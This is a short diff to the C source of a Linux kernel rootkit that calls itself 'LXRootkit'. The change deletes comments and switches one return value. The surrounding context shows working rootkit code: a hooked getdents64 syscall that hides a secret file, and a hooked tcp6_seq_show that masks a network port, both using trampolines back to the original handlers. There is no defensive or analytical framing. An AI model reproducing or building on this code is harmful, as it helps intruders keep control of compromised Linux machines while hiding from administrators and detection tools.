@@ -18,16 +18,7 @@
 asmlinkage int my_sys_getdents64(
         struct pt_regs *regs
         )
-{
-     
-  /* 
-params: 
-    RDI: fd 
-    RSI: linux_dirent64 structure pointer 
-    RDX: dirent
-    R10: count 
-    */  
-  
+{ 
     /* restore the function pointer to return to original handler */ 
     org_sys_getdents64 = hi.originalFunc; 
     int ret = org_sys_getdents64(regs); 
@@ -68,7 +59,7 @@ static int my_tcp6_seq_show(struct seq_file *file, void *v)
 // then save the return value by emitting the rax value to a varible and return it a follows : return tramp() instead what we have now. But it works pretty good... :v) 
     
     tramp(); /* trampoline to the original function */ 
-    return 1;
+    return 0;
 }
 
 static int __init rootkit_init(void) {
@@ -80,7 +71,6 @@ static int __init rootkit_init(void) {
     printk(KERN_INFO "[*] LXRootkit: hiding file: %s\n", SECRET);
     printk(KERN_INFO "[*] LXRootkit: masking port: %x(%d)\n", PORT_TO_HIDE, PORT_TO_HIDE);
 
-    /* NOTE: tcp6 isn't default protocal, there is tcp4 as well. I have to find a way to make it more flexible :). */ 
     unsigned long tcp6_addr = dumpAddr("tcp6_seq_show");
 
     hook_syscall_x64(my_sys_getdents64, __NR_getdents64); 
